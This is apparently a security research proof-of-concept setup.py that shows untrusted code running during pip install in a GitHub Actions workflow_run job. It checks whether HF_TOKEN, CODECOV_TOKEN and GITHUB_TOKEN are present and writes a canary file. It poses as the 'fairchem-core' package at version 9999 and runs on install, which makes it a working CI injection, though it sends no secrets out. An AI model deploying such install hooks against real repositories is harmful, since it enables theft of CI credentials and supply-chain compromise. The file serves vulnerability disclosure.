# Security Research PoC — ACTIONSTRAIL-POC-20260719-230250-89397
# This demonstrates that pip install during workflow_run executes
# attacker-controlled code with HF_TOKEN in the environment.
import os, setuptools

# Evidence: show secrets are accessible (not exfiltrating real values)
hf_present = bool(os.environ.get('HF_TOKEN', ''))
codecov_present = bool(os.environ.get('CODECOV_TOKEN', ''))
gh_present = bool(os.environ.get('GITHUB_TOKEN', ''))

# Write canary output to a file (collected as workflow artifact)
with open('/tmp/ACTIONSTRAIL-POC-20260719-230250-89397-canary.txt', 'w') as f:
    f.write(f'POC_ID: ACTIONSTRAIL-POC-20260719-230250-89397\n')
    f.write(f'HF_TOKEN present: {hf_present}\n')
    f.write(f'CODECOV_TOKEN present: {codecov_present}\n')
    f.write(f'GITHUB_TOKEN present: {gh_present}\n')
    f.write(f'Runner: ' + os.environ.get('RUNNER_NAME', 'unknown') + '\n')
    f.write(f'Repo: ' + os.environ.get('GITHUB_REPOSITORY', 'unknown') + '\n')

print(f'[PoC] ACTIONSTRAIL-POC-20260719-230250-89397 — secrets accessible during pip install: HF_TOKEN={hf_present}')
setuptools.setup(name='fairchem-core', version='9999.0.0.dev0')
